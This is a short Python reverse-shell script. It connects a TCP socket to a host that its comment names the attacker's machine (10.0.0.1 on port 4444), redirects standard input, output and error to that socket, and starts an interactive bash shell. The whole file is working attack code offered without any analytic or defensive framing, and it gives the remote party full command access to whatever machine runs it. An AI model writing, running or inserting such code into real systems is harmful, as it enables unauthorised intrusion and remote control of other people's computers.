import socket
import subprocess
import os

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to attacker's machine
s.connect(("10.0.0.1", 4444))

# Redirect stdin/stdout/stderr
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Execute shell
subprocess.call(["/bin/bash", "-i"])
